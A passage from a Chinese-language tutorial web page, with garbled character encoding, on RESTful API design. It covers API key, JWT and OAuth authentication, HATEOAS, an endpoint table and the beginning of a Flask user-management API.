Key<br>   GET <span class="hljs-operator">/</span>users<span class="hljs-operator">?</span>api_key<span class="hljs-operator">=</span>your_api_key<br>   æˆ–<br>   <span class="hljs-params">Headers:</span> <span class="hljs-params">X-API-Key:</span> your_api_key<br><br>   ä¼˜ç‚¹ï¼šç®€å•ã€æ˜“äºç®¡ç†<br>   ç¼ºç‚¹ï¼šå¯†é’¥æ³„éœ²é£é™©<br><br><span class="hljs-number">3</span>. JWT (JSON Web Token)ï¼ˆæ¨èï¼‰<br>   <span class="hljs-params">Authorization:</span> Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...<br><br>   ä¼˜ç‚¹ï¼šæ— çŠ¶æ€ã€å¯æ‰©å±•ã€ä¿¡æ¯ä¸°å¯Œ<br>   ç¼ºç‚¹ï¼šä»¤ç‰Œè¾ƒå¤§<br><br><span class="hljs-number">4</span>. OAuth <span class="hljs-number">2.0</span><br>   ç”¨äºç¬¬ä¸‰æ–¹æˆæƒ<br><br>   æµç¨‹ï¼š<br>   <span class="hljs-number">1</span>. å®¢æˆ·ç«¯è¯·æ±‚æˆæƒ<br>   <span class="hljs-number">2</span>. ç”¨æˆ·åŒæ„æˆæƒ<br>   <span class="hljs-number">3</span>. è·å–è®¿é—®ä»¤ç‰Œ<br>   <span class="hljs-number">4</span>. ä½¿ç”¨ä»¤ç‰Œè®¿é—®èµ„æº<br><br>JWTç»“æ„ï¼š<br>Header.Payload.Signature<br><br>&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,        <span class="hljs-comment"># ç®—æ³•</span><br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>           <span class="hljs-comment"># ç±»å‹</span><br>&#125;<br>.<br>&#123;<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,          <span class="hljs-comment"># ç”¨æˆ·ID</span><br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1516239022</span>,     <span class="hljs-comment"># ç­¾å‘æ—¶é—´</span><br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1516242622</span>      <span class="hljs-comment"># è¿‡æœŸæ—¶é—´</span><br>&#125;<br>.<br>HMACSHA256(<br>  base64UrlEncode(header) <span class="hljs-operator">+</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-operator">+</span><br>  base64UrlEncode(payload),<br>  secret<br>)<br></code></pre></td></tr></table></figure><h3 id="3-4-HATEOAS"><a href="#3-4-HATEOAS" class="headerlink" title="3.4 HATEOAS"></a>3.4 HATEOAS</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs groovy">HATEOAS (Hypermedia <span class="hljs-keyword">as</span> the Engine of Application State)<br>è¶…åª’ä½“é©±åŠ¨çš„åº”ç”¨çŠ¶æ€<br><br>åŸåˆ™ï¼š<br>APIå“åº”ä¸­åŒ…å«ç›¸å…³æ“ä½œçš„é“¾æ¥<br><br>ç¤ºä¾‹ï¼š<br>GET <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br><br>å“åº”ï¼š<br>&#123;<br>  <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>,<br>  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span>,<br>  <span class="hljs-string">&quot;links&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;self&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;update&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PUT&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;delete&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;DELETE&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;rel&quot;</span>: <span class="hljs-string">&quot;orders&quot;</span>,<br>      <span class="hljs-string">&quot;href&quot;</span>: <span class="hljs-string">&quot;/users/123/orders&quot;</span>,<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span><br>    &#125;<br>  ]<br>&#125;<br><br>ä¼˜ç‚¹ï¼š<br>- APIè‡ªè§£é‡Š<br>- å®¢æˆ·ç«¯ä¸éœ€è¦ç¡¬ç¼–ç URL<br>- æ˜“äºæ¼”åŒ–<br><br>ç¼ºç‚¹ï¼š<br>- å¢åŠ å“åº”å¤§å°<br>- å®ç°å¤æ‚<br></code></pre></td></tr></table></figure><hr><h2 id="4-å®æˆ˜é¡¹ç›®ï¼šç”¨æˆ·ç®¡ç†API"><a href="#4-å®æˆ˜é¡¹ç›®ï¼šç”¨æˆ·ç®¡ç†API" class="headerlink" title="4. å®æˆ˜é¡¹ç›®ï¼šç”¨æˆ·ç®¡ç†API"></a>4. å®æˆ˜é¡¹ç›®ï¼šç”¨æˆ·ç®¡ç†API</h2><h3 id="4-1-APIè®¾è®¡"><a href="#4-1-APIè®¾è®¡" class="headerlink" title="4.1 APIè®¾è®¡"></a>4.1 APIè®¾è®¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">ç”¨æˆ·ç®¡ç†APIè®¾è®¡ï¼š<br><br>èµ„æºï¼šUsersï¼ˆç”¨æˆ·ï¼‰<br><br>ç«¯ç‚¹è®¾è®¡ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ–¹æ³•   â”‚ URI             â”‚ æè¿°             â”‚ çŠ¶æ€ç   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ GET    â”‚ /api/v1/users   â”‚ è·å–ç”¨æˆ·åˆ—è¡¨     â”‚ 200     â”‚<br>â”‚ GET    â”‚ /api/v1/users/1 â”‚ è·å–æŒ‡å®šç”¨æˆ·     â”‚ 200/404 â”‚<br>â”‚ POST   â”‚ /api/v1/users   â”‚ åˆ›å»ºæ–°ç”¨æˆ·       â”‚ 201     â”‚<br>â”‚ PUT    â”‚ /api/v1/users/1 â”‚ æ›´æ–°ç”¨æˆ·ï¼ˆå®Œæ•´ï¼‰ â”‚ 200/404 â”‚<br>â”‚ PATCH  â”‚ /api/v1/users/1 â”‚ æ›´æ–°ç”¨æˆ·ï¼ˆéƒ¨åˆ†ï¼‰ â”‚ 200/404 â”‚<br>â”‚ DELETE â”‚ /api/v1/users/1 â”‚ åˆ é™¤ç”¨æˆ·         â”‚ 204/404 â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æŸ¥è¯¢å‚æ•°ï¼š<br>- ?page=1&amp;<span class="hljs-built_in">limit</span>=20    <span class="hljs-comment"># åˆ†é¡µ</span><br>- ?role=admin         <span class="hljs-comment"># æŒ‰è§’è‰²è¿‡æ»¤</span><br>- ?search=å¼           <span class="hljs-comment"># æœç´¢</span><br>- ?<span class="hljs-built_in">sort</span>=created_at    <span class="hljs-comment"># æ’åº</span><br></code></pre></td></tr></table></figure><h3 id="4-2-ä»£ç å®ç°"><a href="#4-2-ä»£ç å®ç°" class="headerlink" title="4.2 ä»£ç å®ç°"></a>4.2 ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day30_restful_api.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šç®€å•çš„RESTful APIå®ç°</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># æ¨¡æ‹Ÿæ•°æ®åº“</span><br>users_db = &#123;&#125;<br><br><span class="hljs-comment"># åˆå§‹åŒ–ä¸€äº›æµ‹è¯•æ•°æ®</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_data</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;åˆå§‹åŒ–æµ‹è¯•æ•°æ®&quot;&quot;&quot;</span><br>    users = [<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;æå››&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;li@example.com&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;ç‹äº”&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;wang@example.com&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;,<br>    ]<br><br>    <span class="hljs-keyword">for</span> user_data <span class="hljs-keyword">in</span> users:<br>        user_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>        users_db[user_id] = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: user_id,<br>            **user_data,<br>            <span class="hljs-string">&quot;created_at&quot;</span>: datetime.now().isoformat(),<br>            <span class="hljs-string">&quot;updated_at&quot;</span>: datetime.now().isoformat()<br>        &#125;<br><br>init_data()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success_response</span>(<span class="hljs-params">data=<span class="hljs-literal">None</span>, message=<span class="hljs-string">&quot;æ“ä½œæˆåŠŸ&quot;</span>, status_code=<span class="hljs-number">200</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æˆåŠŸå“åº”æ ¼å¼</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        data: è¿”å›çš„æ•°æ®</span><br><span class="hljs-string">        message: æç¤ºä¿¡æ¯</span><br><span class="hljs-string">        status_code: HTTPçŠ¶æ€ç </span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    response = &#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: message<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        response[<span class="hljs-string">&quot;data&quot;</span>] = data<br><br>    <span class="hljs-keyword">return</span> jsonify(response), status_code<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error_response</span>(<span class="hljs-params">message=<span class="hljs-string">&quot;æ“ä½œå¤±è´¥&quot;</span>, code=<span class="hljs-string">&quot;ERROR&quot;</span>, details=<span class="hljs-literal">None</span>, status_code=<span class="hljs-number">400</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    é”™è¯¯å“åº”æ ¼å¼</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        message: é”™è¯¯ä¿¡æ¯</span><br><span class="hljs-string">        code: é”™è¯¯ä»£ç </span><br><span class="hljs-string">        details: é”™è¯¯è¯¦æƒ…</span><br><span class="hljs-string">        status_code: HTTPçŠ¶æ€ç </span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    response = &#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>        <span class="hljs-string">&quot;error&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;code&quot;</span>: code,<br>            <span class="hljs-string">&quot;message&quot;</span>: message<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> details:<br>        response[<span class="hljs-string">&quot;error&quot;</span>][<span class="hljs-string">&quot;details&quot;</span>] = details<br><br>    <span class="hljs-keyword">return</span> jsonify(response), status_code<br><br><br><span class="hljs-comment"># ============================================================</span><br><span class="hljs-comment"># ç”¨æˆ·ç®¡ç†API</span><br><span class="hljs-comment"># ============================================================</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–ç”¨æˆ·åˆ—è¡¨</span><br><span class="hljs-string"></span><br><span class="hljs-string">    æŸ¥è¯¢å‚æ•°ï¼š</span><br><span class="hljs-string">        page: é¡µç ï¼ˆé»˜è®¤1ï¼‰</span><br><span class="hljs-string">        limit: æ¯é¡µæ•°é‡ï¼ˆé»˜è®¤20ï¼‰</span><br><span class="hljs-string">        role: è§’è‰²è¿‡æ»¤</span><br><span class="hljs-string">        search: æœç´¢ï¼ˆå§“åæˆ–é‚®ç®±ï¼‰</span><br><span class="hljs-string">        sort: æ’åºå­—æ®µ</span><br><span class="hljs-string">        order: æ’åºé¡ºåºï¼ˆasc/descï¼‰</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># è·å–æŸ¥è¯¢å‚æ•°</span><br>    page = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;page&#x27;</span>, <span class="hljs-number">1</span>))<br>    limit = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;limit&#x27;</span>, <span class="hljs-number">20</span>))<br>    role = request.args.get(<span class="hljs-string">&#x27;role&#x27;</span>)<br>    search = request.args.get(<span class="hljs-string">&#x27;search&#x27;</span>)<br>    sort_field = request.args.get(<span class="hljs-string">&#x27;sort&#x27;</span>, <span class="hljs-string">&#x27;created_at&#x27;</span>)<br>    sort_order = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;desc&#x27;</span>)<br><br>    <span class="hljs-comment"># è·å–æ‰€æœ‰ç”¨æˆ·</span><br>    users_list = <span class="hljs-built_in">list</span>(users_db.values())<br><br>    <span class="hljs-comment"># è¿‡æ»¤</span><br>    <span class="hljs-keyword">if</span> role:<br>        users_list = [u <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users_list <span class="hljs-keyword">if</span> u.get(<span class="hljs-string">&#x27;role&#x27;</span>) == role]<br><br>    <span class="hljs-keyword">if</span> search:<br>        users_list = [<br>            u <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users_list<br>            <span class="hljs-keyword">if</span> search.lower() <span class="hljs-keyword">in</span> u.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).lower()<br>            <span class="hljs-keyword">or</span> search.lower() <span class="hljs-keyword">in</span> u.get(<span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).lower()<br>        ]<br><br>    <span class="hljs-comment"># æ’åº</span><br>    reverse = (sort_order == <span class="hljs-string">&#x27;desc&#x27;</span>)<br>    users_list.sort(key=<span class="hljs-keyword">lambda</span> x: x.get(sort_field, <span class="hljs-string">&#x27;&#x27;</span>), reverse=reverse)<br><br>    <span class="hljs-comment"># åˆ†é¡µ</span><br>    total = <span class="hljs-built_in">len</span>(users_list)<br>    start = (page - <span class="hljs-number">1</span>) * limit<br>    end = start + limit<br>    users_page = users_list[start:end]<br><br>    <span class="hljs-comment"># æ„é€ å“åº”</span><br>    response_data = &#123;<br>        <span class="hljs-string">&quot;users&quot;</span>: users_page,<br>        <span class="hljs-string">&quot;pagination&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;total&quot;</span>: total,<br>            <span class="hljs-string">&quot;page&quot;</span>: page,<br>            <span class="hljs-string">&quot;limit&quot;</span>: limit,<br>            <span class="hljs-string">&quot;pages&quot;</span>: (total + limit - <span class="hljs-number">1</span>) // limit<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> success_response(response_data, <span class="hljs-string">&quot;è·å–ç”¨æˆ·åˆ—è¡¨æˆåŠŸ&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–æŒ‡å®šç”¨æˆ·</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-string">        user_id: ç”¨æˆ·ID</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    user = users_db.get(user_id)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">f&quot;ç”¨æˆ·ä¸å­˜åœ¨&quot;</span>,<br>            code=<span 